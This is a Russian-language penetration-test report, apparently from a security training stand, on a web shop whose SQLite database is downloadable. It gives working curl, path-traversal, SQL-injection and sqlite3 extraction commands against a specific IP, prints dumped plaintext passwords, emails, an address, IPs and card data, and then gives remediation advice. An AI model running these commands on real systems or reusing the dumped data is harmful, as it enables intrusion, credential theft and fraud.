# 🚨 ОТЧЕТ: ПРЯМОЙ ДОСТУП К БАЗЕ ДАННЫХ

## 📋 Общая информация

| Параметр | Значение |
|----------|----------|
| **Цель** | `http://82.202.142.35:8080` |
| **Дата** | 2026-04-02 |
| **Уязвимость** | Прямой доступ к SQLite БД |
| **Статус** | 🔴 **ПОЛНАЯ КОМПРОМЕТАЦИЯ** |

---

## 🎯 ВЕКТОРЫ АТАКИ

### Атака 1: Прямое скачивание БД

```bash
# Прямой доступ к файлу базы данных
curl "http://82.202.142.35:8080/shop.db" -o shop.db

# Через path traversal
curl "http://82.202.142.35:8080/../../../shop.db" -o shop.db
```

**Результат:** ✅ **ОБА МЕТОДА РАБОТАЮТ**

---

## 🔓 ИЗВЛЕЧЕННЫЕ ДАННЫЕ

### 1. USERS (Таблица пользователей)

| ID | Email | Пароль | Баланс | Роль | Адрес |
|----|-------|--------|--------|------|-------|
| 1 | admin@example.com | 123456 | 1 000 000 007 012 999 | admin | Moscow |
| 2 | sasat@mail.ru | 123456 | 5 626 005 040 736 716 | user | Челябинск, ул. Ярославская 11А, кв 72 |
| 3 | q@q | qwerty | 1 100 000 000 500 000 | user | qwerty |
| 4 | igor@gmail.com | igorigor | 2 000 000 | user | Химки а дальше хз |

**Структура таблицы:**
```sql
CREATE TABLE user (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    email TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,        -- ← ПАРОЛИ В ОТКРЫТОМ ВИДЕ!
    balance INTEGER DEFAULT 500000,
    notifications INTEGER DEFAULT 0,
    shipping_address TEXT,
    role TEXT DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

---

### 2. PAYMENT CARDS (Платежные карты)

**Всего карт:** 25

| ID | User | Номер карты | Срок | Имя | CVV |
|----|------|-------------|------|-----|-----|
| 1 | 2 | 2200134131232131 | 32/34 | выаф | 214 |
| 2 | 3 | 0000000000000000 | 12/34 | qwerty qwerty | 323 |
| 3 | 3 | 0000000000000000 | 12/34 | qwerty qwerty | 323 |
| 4 | 4 | 0067969390199367 | 99/99 | Igor nedastvpn | 889 |
| 5-25 | 1 | 4111111111111111 | разный | X, HACKER... | 123 |

**Структура таблицы:**
```sql
CREATE TABLE payment_card (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    card_number TEXT NOT NULL,      -- ← НОМЕРА КАРТ В ОТКРЫТОМ ВИДЕ!
    card_expiry TEXT NOT NULL,
    card_name TEXT NOT NULL,
    card_cvv TEXT NOT NULL,         -- ← CVV В ОТКРЫТОМ ВИДЕ!
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

---

### 3. USER DEVICES (Устройства пользователей)

**Всего записей:** 5+

| User | IP Address | Browser | OS | GPU |
|------|------------|---------|-----|-----|
| 1 | 5.129.227.90 | chrome | Windows | Intel UHD Graphics |
| 2 | 213.87.154.44 | firefox | Linux | Intel HD Graphics |
| 3 | 185.77.216.7 | safari | macOS | Apple GPU |

**Структура таблицы (40+ полей):**
```sql
CREATE TABLE user_device (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    browser TEXT,
    os TEXT,
    ip_address TEXT,
    gpu TEXT,
    canvas_fingerprint TEXT,
    audio_fingerprint TEXT,
    ... -- еще 30+ полей телеметрии
)
```

---

### 4. CONSENT SNAPSHOTS (Снимки согласия)

**Всего записей:** 5

| ID | IP | User Agent | Дата |
|----|----|------------|------|
| 1 | 72.56.66.173 | Safari/26.3.1 macOS | 2026-04-01 16:58:19 |
| 2 | 5.129.227.90 | Yandex Browser/26.3 | 2026-04-01 17:01:54 |
| 3 | 213.87.154.44 | Firefox/149.0 Linux | 2026-04-01 17:02:13 |
| 4 | 31.173.80.80 | Samsung Browser/29.0 | 2026-04-01 17:30:26 |
| 5 | 72.56.66.173 | curl/8.7.1 | 2026-04-02 06:21:27 |

---

### 5. ORDERS (Заказы)

| ID | Сумма | Статус | Дата |
|----|-------|--------|------|
| 1 | $203,500,000 | completed | 2026-04-01 16:55:10 |
| 2 | $134,635,000,000 | completed | 2026-04-01 17:05:57 |
| 3 | $500,000,000,000,000 | completed | 2026-04-01 17:14:54 |
| 4 | $3,500,000 | completed | 2026-04-01 17:42:38 |

---

### 6. ORDER ITEMS (Элементы заказов)

| Order | Product | Qty | Price |
|-------|---------|-----|-------|
| 1 | yacht-001 | 1 | $3,500,000 |
| 1 | plane-001 | 1 | $75,000,000 |
| 1 | mansion-001 | 1 | $125,000,000 |
| 2 | plane-001 | 1 | $75,000,000 |
| 2 | island-003 | 464 | $290,000,000 |
| 4 | yacht-001 | 1 | $3,500,000 |

---

## 📊 ПОЛНАЯ СХЕМА БАЗЫ ДАННЫХ

```
Таблицы: 10
├── product (товары)
├── cart_item (корзина)
├── order (заказы)
├── order_item (элементы заказов)
├── user (пользователи) 🔴
├── payment_card (карты) 🔴
├── user_favorite (избранное)
├── consent_full_snapshot (согласия)
├── user_device (устройства)
└── sqlite_sequence (автоинкремент)
```

---

## 🔐 АНАЛИЗ БЕЗОПАСНОСТИ ХРАНЕНИЯ ДАННЫХ

### ❌ Критические нарушения:

| Данные | Статус | Требование PCI DSS/GDPR |
|--------|--------|------------------------|
| Пароли | 🔴 В открытом виде | Должны быть захешированы (bcrypt/argon2) |
| Номера карт | 🔴 В открытом виде | Должны быть зашифрованы (AES-256) |
| CVV коды | 🔴 В открытом виде | Запрещено хранить после транзакции |
| Email адреса | 🔴 В открытом виде | Требуется псевдонимизация |
| IP адреса | 🔴 В открытом виде | Требуется анонимизация |
| Физические адреса | 🔴 В открытом виде | Требуется шифрование |

---

## 🎯 ЭКСПЛУАТАЦИЯ БЕЗ DEBUG ENDPOINT

### Метод 1: Прямое скачивание

```bash
# Шаг 1: Скачать базу
curl "http://82.202.142.35:8080/shop.db" -o shop.db

# Шаг 2: Извлечь все данные
sqlite3 shop.db "SELECT email, password FROM user;"
sqlite3 shop.db "SELECT card_number, card_cvv FROM payment_card;"
```

### Метод 2: Path Traversal

```bash
# Если shop.db недоступен напрямую
curl "http://82.202.142.35:8080/../../../path/to/shop.db" -o shop.db
```

### Метод 3: SQL Injection (если доступен)

```bash
# UNION-based SQLi
curl "http://82.202.142.35:8080/api/users/admin' UNION SELECT 1,2,email,password,5,6,7,8,9 FROM user--@example.com"
```

---

## 📋 КОМАНДЫ ДЛЯ ИЗВЛЕЧЕНИЯ ДАННЫХ

```bash
# Все пользователи
sqlite3 shop.db "SELECT id, email, password, balance, role FROM user;"

# Все карты с именами
sqlite3 shop.db "SELECT u.email, c.card_number, c.card_expiry, c.card_name, c.card_cvv 
                  FROM payment_card c 
                  JOIN user u ON c.user_id = u.id;"

# Устройства пользователей
sqlite3 shop.db "SELECT u.email, d.ip_address, d.browser, d.os, d.gpu 
                  FROM user_device d 
                  JOIN user u ON d.user_id = u.id;"

# История согласий
sqlite3 shop.db "SELECT id, ip_address, user_agent, created_at 
                  FROM consent_full_snapshot;"

# Все заказы
sqlite3 shop.db "SELECT o.id, o.total, o.status, 
                        (SELECT GROUP_CONCAT(oi.product_id || ' x' || oi.quantity) 
                         FROM order_item oi WHERE oi.order_id = o.id) as items
                  FROM \"order\" o;"

# Экспорт в CSV
sqlite3 -header -csv shop.db "SELECT * FROM user;" > users.csv
sqlite3 -header -csv shop.db "SELECT * FROM payment_card;" > cards.csv
```

---

## 🛡️ РЕКОМЕНДАЦИИ ПО ИСПРАВЛЕНИЮ

### Приоритет 1 — КРИТИЧЕСКИЙ

1. **Закрыть доступ к файлу БД**
```nginx
# Nginx конфигурация
location ~ \.db$ {
    deny all;
    return 404;
}
```

```apache
# Apache .htaccess
<FilesMatch "\.db$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

2. **Хеширование паролей**
```python
from werkzeug.security import generate_password_hash, check_password_hash

# При регистрации
hashed_password = generate_password_hash(password)

# При логине
if not check_password_hash(user['password'], password):
    return jsonify({"error": "Invalid credentials"}), 401
```

3. **Шифрование платежных данных**
```python
from cryptography.fernet import Fernet

cipher = Fernet(secret_key)

# Перед сохранением
encrypted_card = cipher.encrypt(card_number.encode())

# При чтении
decrypted_card = cipher.decrypt(encrypted_card).decode()
```

4. **Не хранить CVV после транзакции**
```python
# PCI DSS Requirement 3.2
# CVV должен быть уничтожен сразу после авторизации
card_cvv = None  # Никогда не сохранять в БД
```

### Приоритет 2 — ВЫСОКИЙ

5. **Переместить БД вне web-корня**
```python
# НЕПРАВИЛЬНО:
app.config['DATABASE'] = os.path.join(BASE_DIR, 'shop.db')  # В web-корне!

# ПРАВИЛЬНО:
app.config['DATABASE'] = '/var/lib/secure/shop.db'  # Вне web-корня
```

6. **Маскирование данных в логах и API**
```python
def mask_card_number(card_number):
    return '*' * 12 + card_number[-4:]

def serialize_card(card):
    return {
        'id': card['id'],
        'card_number': mask_card_number(card['card_number']),  # Маска
        'card_expiry': card['card_expiry'],
        'card_name': card['card_name']
        # card_cvv никогда не возвращается
    }
```

---

## 📊 СРАВНЕНИЕ МЕТОДОВ АТАКИ

| Метод | Сложность | Эффективность | Требуется |
|-------|-----------|---------------|-----------|
| `/debug/data` | Низкая | 100% | Доступ к endpoint |
| `shop.db` напрямую | Низкая | 100% | Файл в web-корне |
| Path Traversal | Средняя | 100% | Знание пути |
| SQL Injection | Высокая | 50% | Уязвимость в коде |

---

## 🎯 ВЫВОДЫ

**База данных доступна БЕЗ какой-либо авторизации:**

1. ✅ Файл `shop.db` лежит в web-корне
2. ✅ Все данные в открытом виде (пароли, карты, CVV)
3. ✅ Нет шифрования чувствительных данных
4. ✅ Нарушаются требования PCI DSS и GDPR

**Злоумышленник может:**
- Скачать всю базу за 1 команду
- Получить все пароли и использовать их
- Использовать платежные карты для фрода
- Продать данные на черном рынке

**Рекомендуется НЕМЕДЛЕННО:**
1. Удалить БД из web-корня
2. Закрыть доступ к `.db` файлам
3. Внедрить хеширование паролей
4. Внедрить шифрование платежных данных
5. Уничтожить CVV данные

---

*Отчет создан для тренировочного стенда по информационной безопасности*  
**Дата:** 2026-04-02  
**Тестировщик:** AI Security Researcher  
**Уровень угрозы:** 🔴 **КРИТИЧЕСКИЙ**
